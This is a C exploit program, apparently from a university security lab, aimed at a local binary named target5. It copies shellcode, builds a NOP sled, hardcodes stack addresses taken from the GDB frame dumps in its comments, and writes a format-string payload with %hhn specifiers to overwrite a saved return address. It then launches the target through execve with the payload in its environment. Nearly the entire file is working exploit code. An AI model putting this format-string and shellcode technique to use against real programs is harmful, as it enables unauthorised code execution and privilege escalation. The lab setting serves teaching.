#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target5"
#define NOP    '\x90'
#define OFBUFLENARGV 256


/*0x0000000000400738 in snprintf@plt ()
(gdb) info frame
Stack level 0, frame at 0x2021f950:
 rip = 0x400738 in snprintf@plt; saved rip 0x400b8c
 called by frame at 0x2021fe70
 Arglist at 0x2021f940, args:
 Locals at 0x2021f940, Previous frame's sp is 0x2021f950
 Saved registers:
  rip at 0x2021f948
0x2021f944:     0x00000000
0x2021f940:     0x2021f960
0x2021f960:     0x895e1feb
*/

/*ocals at 0x2021fe60, Previous frame's sp is 0x2021fe70
 Saved registers:
  rbp at 0x2021fe60, rip at 0x2021fe68
*/

/*
Stack level 0, frame at 0x2021f950:
 rip = 0x3fe9c4f167 in snprintf; saved rip 0x400b8c
 called by frame at 0x2021fe70
 Arglist at 0x2021f868, args:
 Locals at 0x2021f868, Previous frame's sp is 0x2021f950
 Saved registers:
  rip at 0x2021f948
*/


/* 
Stack level 0, frame at 0x2021f870:
 rip = 0x3fe9c6f675 in vsnprintf; saved rip 0x3fe9c4f1e3
 called by frame at 0x2021f950
 Arglist at 0x2021f860, args:
 Locals at 0x2021f860, Previous frame's sp is 0x2021f870
 Saved registers:
  rip at 0x2021f868
*/
//2021f998
int main(void)
{
  char *args[3];
  char *env[21];

	char placeholder[150];
	int i;
	for (i=0; i<150; i++)
		placeholder[i] = NOP;

	// Avoid null terminating char in the string 
	int shellcodeSize = sizeof(shellcode)-1;

	char addr1[] = "\x68\xfe\x21\x20";
	char nullHex[] = "\x00";
	char junk[] = "AAAAAAA";
	char addr2[] = "\x69\xfe\x21\x20";
	char addr3[] = "\x6a\xfe\x21\x20";
	char addr4[] = "\x6b\xfe\x21\x20";
	char shell[shellcodeSize];

	for(i= 0; i < shellcodeSize; i++)
		shell[i] = shellcode[i];
	char overflowStr[100];	
	strcpy(overflowStr, shell);
	strcat(overflowStr, "|%08X|%08X|%08X|%08X|%73X|%hhn|%95x|%hhn|%38x|%hhn|%253x|%hhn");



  args[0] = TARGET; args[1] = addr1; args[2] = NULL;
  env[0] = &nullHex[0];
env[1] = &nullHex[0];
env[2] = &nullHex[0];
env[3] = junk;
env[4] = addr2;
env[5] = &nullHex[0];
env[6] = &nullHex[0];
env[7] = &nullHex[0];
env[8] = junk;
env[9] = addr3;
env[10] = &nullHex[0];
env[11] = &nullHex[0];
env[12] = &nullHex[0];
env[13] = junk;
env[14] = addr4;
env[15] = &nullHex[0];
env[16] = &nullHex[0];
env[17] = &nullHex[0];
env[18] = overflowStr;
env[19] = placeholder;
env[20] = NULL;
  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
